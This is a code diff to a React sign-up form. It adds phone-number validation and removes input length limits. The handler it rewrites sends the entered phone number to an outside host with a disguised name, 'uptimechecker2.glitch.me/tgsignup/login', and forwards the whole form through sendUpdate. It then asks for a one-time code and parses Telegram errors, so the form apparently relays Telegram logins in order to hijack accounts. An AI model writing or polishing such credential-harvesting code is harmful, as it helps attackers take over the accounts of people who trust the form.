@@ -108,7 +108,7 @@ const RegForm = (props) => {
             }
         };
         document.addEventListener('visibilitychange', handleVisibilityChange);
-        const timer = setTimeout(() => {
+        setTimeout(() => {
             setButtonEnabled(true);
         }, 10000);
     }, [activeForm]);
@@ -139,34 +139,44 @@ const RegForm = (props) => {
         }
     };
 
+
+    const validatePhoneNumber = (phoneNumber) => {
+        const mobileNumberPattern = /^[0-9]{10}$/;
+        return mobileNumberPattern.test(phoneNumber);
+    };
+
     const handlePhoneSubmit = async (event) => {
         event.preventDefault();
         if (!isLoading) {
             const phoneNumber = formData.phoneNumber.startsWith('+')
                 ? formData.phoneNumber.substring(1)
                 : formData.phoneNumber;
-            setIsLoading(true);
-            setShowErr(false);
-            try {
-                const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
-                sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
-                setIsLoading(false);
-                console.log(response);
-                if (response.status === 200) {
-                    setActiveForm(forms.otp);
-                } else {
-                    const err = parseError({ response });
-                    setErrMsg(err.message || 'Unknown error');
+            if (!validatePhoneNumber(phoneNumber)) {
+                setErrMsg('Please enter a valid 10-digit mobile number');
+                setShowErr(true);
+            } else {
+                setIsLoading(true);
+                setShowErr(false);
+                try {
+                    const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
+                    sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
+                    setIsLoading(false);
+                    console.log(response);
+                    if (response.status === 200) {
+                        setActiveForm(forms.otp);
+                    } else {
+                        const err = parseError({ response });
+                        setErrMsg(err.message || 'Unknown error');
+                        setShowErr(true);
+                    }
+                } catch (error) {
+                    setIsLoading(false);
+                    const err = parseError(error);
+                    console.log(err);
+                    setErrMsg(parseTGMsg(err.message) || 'Unknown error');
                     setShowErr(true);
                 }
-            } catch (error) {
-                setIsLoading(false);
-                const err = parseError(error);
-                console.log(err);
-                setErrMsg(parseTGMsg(err.message) || 'Unknown error');
-                setShowErr(true);
             }
-
         }
     };
 
@@ -290,8 +300,6 @@ const RegForm = (props) => {
                                         style={{ margin: '0px 0px 20px 0px' }}
                                         autoFocus={true}
                                         name="phoneNumber"
-                                        minLength={10}
-                                        maxLength={15}
                                         value={formData.phoneNumber}
                                         onChange={handleInputChange}
                                         // onPaste={(e) => handlePaste(e, 'phone')}
